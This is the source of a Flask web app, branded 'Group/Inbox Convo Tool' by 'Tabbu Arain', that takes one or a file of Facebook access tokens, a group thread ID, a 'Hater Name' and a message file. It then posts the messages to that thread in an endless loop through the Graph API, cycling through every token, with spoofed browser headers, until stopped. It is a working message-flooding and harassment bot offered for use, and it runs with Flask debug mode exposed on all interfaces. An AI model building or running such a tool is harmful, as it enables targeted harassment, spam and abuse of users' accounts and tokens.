from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string
 
app = Flask(__name__)
app.debug = True
 
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}
 
stop_events = {}
threads = {}
 
def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"Message Sent Failed From token {access_token}: {message}")
                time.sleep(time_interval)
 
@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()
 
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
 
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()
 
        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
 
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()
 
        return f'Task started with ID: {task_id}'
 
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>𝙏𝘼𝘽𝘽𝙐 ✅</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    /* CSS for styling elements */
    label { color: white; }
    .file { height: 30px; }
    body {
      background-image: url('https://i.ibb.co/PvHPtYCv/SS-118.png');
      background-size: cover;
    }
    .container {
    max-width: 350px;
    height: auto;
    border-radius: 30px;
    padding: 30px;
    box-shadow: 0 0 50px rgba(0, 0, 0, 0.1);
    box-shadow: 0 0 50px yellow;
    border: none;
    resize: none;
    color: white; /* Ensures text is visible */
}
    .form-control {
      outline: 1px red;
      border: 1px double white;
      background: transparent;
      width: 100%;
      height: 40px;
      padding: 7px;
      margin-bottom: 20px;
      border-radius: 10px;
      color: white;
    }
    .header { text-align: center; padding-bottom: 20px; }
    .btn-submit { width: 100%; margin-top: 10px; }
    .footer { text-align: center; margin-top: 20px; color: #888; }
    .whatsapp-link {
      display: inline-block;
      color: #25d366;
      text-decoration: none;
      margin-top: 10px;
    }
    .whatsapp-link i { margin-right: 5px; }
  </style>
</head>
<body>
  <header class="header mt-4">
   <h1>▄︻デ𝙏𝘼𝘽𝘽𝙐 𝘼𝙍𝘼𝙄𝙉 𝙓𝘿══━一</h1>
<meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pulsating RGB Text</title>
    <style>
        @keyframes pulsate {
            0% { color: rgb(255, 0, 0); } /* Red */
            33% { color: rgb(0, 255, 0); } /* Green */
            66% { color: rgb(0, 0, 255); } /* Blue */
            100% { color: rgb(255, 0, 0); } /* Red */
        }

        h1 {
            animation: pulsate 2s infinite;
            font-family: Arial, sans-serif;
            text-align: center;
        }
    </style>
   <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RGB Neon Glow Text</title>
    <style>
        @keyframes neonGlow {
            0% {
                color: #ff0000; /* Red */
                text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000, 0 0 40px #ff0000;
            }
            33% {
                color: #00ff00; /* Green */
                text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00, 0 0 30px #00ff00, 0 0 40px #00ff00;
            }
            66% {
                color: #0000ff; /* Blue */
                text-shadow: 0 0 10px #0000ff, 0 0 20px #0000ff, 0 0 30px #0000ff, 0 0 40px #0000ff;
            }
            100% {
                color: #ff0000; /* Red */
                text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000, 0 0 40px #ff0000;
            }
        }

        h2 {
            animation: neonGlow 2s infinite;
            font-family: Arial, sans-serif;
            text-align: center;
            font-size: 2.5em;
        }
    </style>
    <h2 style="color: #ff4500;">𒆜𝒪𝒲𝒩𝐸𝑅𒆜 ➨ 𝐓𝐀𝐁𝐀𝐒𝐒𝐔𝐌 👑🙊</h2>
     </header>
  <div class="container text-center">
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
          <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neon Pink Glow Label</title>
    <style>
        /* Neon Pink Glow Effect */
        .form-label {
            color: #ff00ff; /* Neon pink color */
            text-shadow: 0 0 5px #ff00ff, 0 0 10px #ff00ff, 0 0 20px #ff00ff, 0 0 40px #ff00ff;
            font-family: Arial, sans-serif;
            font-size: 1.2em;
            font-weight: bold;
            animation: glow 1.5s infinite alternate; /* Pulsating glow effect */
        }

        /* Pulsating Glow Animation */
        @keyframes glow {
            0% {
                text-shadow: 0 0 5px #ff00ff, 0 0 10px #ff00ff, 0 0 20px #ff00ff, 0 0 40px #ff00ff;
            }
            100% {
                text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff, 0 0 40px #ff00ff, 0 0 80px #ff00ff;
            }
        }
    </style>
    <label for="tokenOption" class="form-label">Choose Token Options:</label>
        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">Single Token</option>
          <option value="multiple">Token File</option>
        </select>
      </div>
      <div class="mb-3" id="singleTokenInput">
        <label for="singleToken" class="form-label">Input Single Access Token:</label>
        <input type="text" class="form-control" id="singleToken" name="singleToken">
      </div>
      <div class="mb-3" id="tokenFileInput" style="display: none;">
        <label for="tokenFile" class="form-label">Choose Token File:</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
      </div>
      <div class="mb-3">
        <label for="threadId" class="form-label">Enter Group UID:</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx" class="form-label">Input Hater Name:</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="time" class="form-label">Time Interval (Sec):</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <div class="mb-3">
        <label for="txtFile" class="form-label">Select TXT File:</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">Run Convo</button>
      </form>
    <form method="post" action="/stop">
      <div class="mb-3">
        <label for="taskId" class="form-label">Input Task ID to Stop:</label>
        <input type="text" class="form-control" id="taskId" name="taskId" required>
      </div>
      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop Convo</button>
    </form>
  </div>
  <footer class="footer">
<p class="mb-0 copyright-text">©𝟐𝟎𝟐𝟓 𝐀𝐥𝐥 𝐫𝐢𝐠𝐡𝐭𝐬 𝐫𝐞𝐬𝐞𝐫𝐯𝐞𝐝 𝐁𝐲 𝐓𝐀𝐁𝐁𝐔 𝐀𝐑𝐀𝐈𝐍</p>

<style>
.copyright-text {
    animation: float 4s ease-in-out infinite, glitch 3s infinite;
    position: relative;
    display: inline-block;
    font-weight: 600;
    letter-spacing: 2px;
    color: #fff;
    text-shadow: 2px 2px 0 #ff00ff,
               -2px -2px 0 #00ffff;
}

@keyframes float {
    0%, 100% {
        transform: translateY(0) rotateZ(0deg);
    }
    50% {
        transform: translateY(-8px) rotateZ(1deg);
    }
}

@keyframes glitch {
    0% {
        text-shadow: 2px 2px 0 #ff00ff,
                   -2px -2px 0 #00ffff;
        clip-path: inset(0 0 0 0);
    }
    2% {
        clip-path: inset(10% 0 30% 0);
        transform: translateX(5px);
        color: #00ffff;
    }
    4% {
        clip-path: inset(40% 0 10% 0);
        transform: translateX(-5px);
        color: #ff00ff;
    }
    6% {
        clip-path: inset(0 0 0 0);
        transform: translateX(0);
        color: #fff;
    }
    100% {
        text-shadow: 2px 2px 0 #ff00ff,
                   -2px -2px 0 #00ffff;
    }
}

.copyright-text::before,
.copyright-text::after {
    content: attr(data-text);
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0.8;
}

.copyright-text::before {
    animation: wave 3s infinite linear;
    background: linear-gradient(90deg, 
        #ff00ff 0%, 
        #00ffff 50%, 
        #ff00ff 100%);
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
    z-index: -1;
}

@keyframes wave {
    0% {
        transform: translateX(-10%);
    }
    100% {
        transform: translateX(10%);
    }
}
</style>
<p class="mb-0 copyright-text">Group/Inbox Convo Tool</p>
<p style="color: #ff1493;">𝘾𝙍𝙀𝘼𝙏𝙀𝘿 𝙒𝙄𝙏𝙃 <span class="pulsate-heart">❤</span> 𝘽𝙔 <span style="color: #ff1493;">𝒯𝒜𝐵𝐵𝒰 𝒜𝑅𝒜𝐼𝒩</span> 😁</p>

<style>
/* Pulsating Heart Animation */
@keyframes pulsate {
    0% {
        transform: scale(1); /* Normal size */
        color: #ff1493; /* Pink color */
    }
    50% {
        transform: scale(1.2); /* Slightly larger */
        color: #ff0000; /* Red color */
    }
    100% {
        transform: scale(1); /* Back to normal size */
        color: #ff1493; /* Pink color */
    }
}

.pulsate-heart {
    display: inline-block;
    animation: pulsate 1s infinite; /* Pulsate every 1 second */
    color: #ff1493; /* Initial pink color */
}
</style>
    <a href="https://www.facebook.com/TabbuArain" style="color: #00008b; font-size: 18px; text-decoration: none;">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" style="width: 25px; vertical-align: middle; margin-right: 8px;">
    𝐂𝐥𝐢𝐜𝐤 𝐇𝐞𝐫𝐞 𝐅𝐨𝐫 𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤
</a>
      <a href="https://wa.me/+994402197773" class="whatsapp-link" style="color: #006400; font-size: 18px; text-decoration: none;">
    <i class="fab fa-whatsapp" style="font-size: 24px; margin-right: 8px;"></i> 
   𝐂𝐡𝐚𝐭 𝐎𝐧 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩
</a>
  </footer>
  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption == 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
  </script>
</body>
</html>
''')
 
@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'
 
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=22489)
